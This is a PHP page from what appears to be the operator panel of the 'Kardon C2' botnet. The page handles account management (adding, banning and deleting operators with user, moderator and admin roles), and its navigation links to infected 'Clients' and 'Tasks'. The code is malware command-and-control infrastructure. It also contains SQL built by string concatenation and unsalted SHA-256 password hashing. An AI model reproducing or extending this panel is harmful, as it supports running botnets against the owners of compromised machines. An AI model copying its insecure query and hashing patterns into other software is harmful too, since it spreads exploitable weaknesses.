<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';  
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    label {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 13px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    h6 {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 18px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    </style>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--<?php echo $c_header; ?> mdl-color-text--grey-400">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Users</span>
          <div class="mdl-layout-spacer"></div>
          <?php echo $header;?>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--<?php echo $c_sideBarTop; ?> mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--<?php echo $c_sideBarMain; ?>">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
          <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <?php
          $plugins = array_slice(scandir("./plugin/"), 2);
          foreach ($plugins as &$plugin)
          {
            if(pathinfo($plugin, PATHINFO_EXTENSION) == "php")
            {
              echo '<a class="mdl-navigation__link" href="./plugin/'.$plugin.'">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">note</i>'.ucfirst(basename($plugin, ".php")) .'</a>';
            }
          }
          ?>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--<?php echo $c_main; ?>">
        <div class="mdl-grid demo-content">
            <?php
                if ($userperms == "user")
                {
                    echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>You do not have permission to view this page.</h6></div>';
                    die();
                }
                if (isset($_POST['doAdd']))
                {
                    $user = $_POST['username'];
                    $pass = hash("sha256", $_POST['password']);
                    $perm = $_POST['permissions'];
                    if (ctype_alnum($user))
                    {
                        if (ctype_digit($perm))
                        {
                            switch ($perm)
                            {
                                case "1":
                                    $perm = "user";
                                    break;
                                case "2":
                                    $perm = "moderator";
                                    break;
                                case "3":
                                    $perm = "admin";
                                    break;
                            }
                            if ($userperms == "moderator" && $perm == "admin")
                            {
                                echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>Moderator\'s cannot create admin accounts</h6></center></div>';
                            }
                            else
                            {
                                $i = $odb->prepare("INSERT INTO users VALUES(NULL, :u, :p, :pr, '1')");
                                $i->execute(array(":u" => $user, ":p" => $pass, ":pr" => $perm));
                                $i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                $i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Created user ".$user));
                                echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>Successfully added new user. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                            }
                        }else{
                            echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>Permissions was not a digit.</h6></center></div>';
                        }
                    }else{
                        echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>Username\'s must be alpha-numeric only.</h6></center></div>';
                    }
                }
                if (isset($_GET['del']))
                {
                    
                    $del = $_GET['del'];
                    if (!ctype_digit($del))
                    {
                        echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>User ID was not a digit. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                    }else{
                        if ($del != "1")
                        {
                            $un = $odb->query("SELECT username FROM users WHERE id = '".$del."'")->fetchColumn(0);
                            $d = $odb->prepare("DELETE FROM users WHERE id = :i LIMIT 1");
                            $d->execute(array(":i" => $del));
                            $i3 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                            $i3->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Deleted user ".$un));
                            echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>User has been deleted. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                        }else{
                            echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>This user cannot be deleted. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                        }
                    }
                }
                if (isset($_GET['ban']))
                {
                    $ban = $_GET['ban'];
                    if (!ctype_digit($ban))
                    {
                        echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>User ID was not a digit. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                    }else{
                        if ($ban != "1")
                        {
                            list($st,$un) = $odb->query("SELECT status,username FROM users WHERE id = '".$ban."'")->fetch();
                            if ($st == "1")
                            {
                                $b = $odb->prepare("UPDATE users SET status = '2' WHERE id = :i LIMIT 1");
                                $b->execute(array(":i" => $ban));
                                $i4 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                $i4->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Banned user ".$un));
                                echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>User has been banned. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                            }else{
                                $b = $odb->prepare("UPDATE users SET status = '1' WHERE id = :i LIMIT 1");
                                $b->execute(array(":i" => $ban));
                                $i4 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                $i4->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Unbanned user ".$un));
                                echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>User has been unbanned. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                            }
                        }else{
                            echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><center><h6>This user cannot be banned. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=users">';
                        }
                    }
                }
            ?>
            <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--6-col">
                <center>
                    <h6>Manage</h6>
                    <table class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username</th>
                                <th>Permission</th>
                                <th>Last Access Date</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $users = $odb->query("SELECT * FROM users");
                            while ($us = $users->fetch(PDO::FETCH_ASSOC))
                            {
                                $lds = $odb->prepare("SELECT date FROM plogs WHERE username = :u AND action = 'Logged in' ORDER BY date LIMIT 1");
                                $lds->execute(array(":u" => $us['username']));
                                $ld = $lds->fetchColumn(0);
                                if ($ld == NULL || $ld == "")
                                {
                                    $ld = "Never";
                                }else{
                                    $ld = date("m-d-Y, h:i A", $ld);
                                }
                                $stat = "";
                                if ($us['status'] == "1")
                                {
                                    $stat = '<a href="?p=users&ban='.$us['id'].'" title="Ban User"><i class="fa fa-lock"></i></a>';
                                }else{
                                    $stat = '<a href="?p=users&ban='.$us['id'].'" title="Unban User"><i class="fa fa-unlock-alt"></i></a>';
                                }
                                echo '
                                <tr>
                                <td  class="mdl-data-table__cell--non-numeric">'.$us['id'].'</td>
                                <td  class="mdl-data-table__cell--non-numeric">'.$us['username'].'</td>
                                <td  class="mdl-data-table__cell--non-numeric">'.ucfirst($us['privileges']).'</td>
                                <td  class="mdl-data-table__cell--non-numeric">'.$ld.'</td>
                                <td  class="mdl-data-table__cell--non-numeric">
                                    <center><a href="edituser.php?id='.$us['id'].'" title="Edit User"><i class="fa fa-edit"></i></a>&nbsp;'.$stat.'&nbsp;<a href="?p=users&del='.$us['id'].'" title="Delete User"><i class="fa fa-times-circle"></i></a></center>
                                </td>
                                </tr>
                                ';
                            }
                            ?>
                        </tbody>
                    </table>
                    <br>
                </center>
            </div>
            <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--6-col">
                <center>
                    <h6>New User</h6>
                    <br>
                    <form action="" method="POST" class="col-lg-6">
                        <label>Username</label>
                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="text" class="form-control" name="username"></div>
                        <br>
                        <label>Password</label>
                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" class="form-control" name="password"></div>
                        <br>
                        <label>Permissions</label>

                        <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-1">
                            <input type="radio" id="option-1" class="mdl-radio__button" name="permissions" value="1" checked>
                            <span class="mdl-radio__label">User</span>
                        </label>
                        <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-2">
                            <input type="radio" id="option-2" class="mdl-radio__button" name="permissions" value="2">
                            <span class="mdl-radio__label">Moderator</span>
                        </label>
                        <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-3">
                            <input type="radio" id="option-3" class="mdl-radio__button" name="permissions" value="3">
                            <span class="mdl-radio__label">Admin</span>
                        </label>
                        <br><br>
                        <center><input type="submit" name="doAdd" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400" value="Add User"></center>
                    </form>
                </center>
            </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
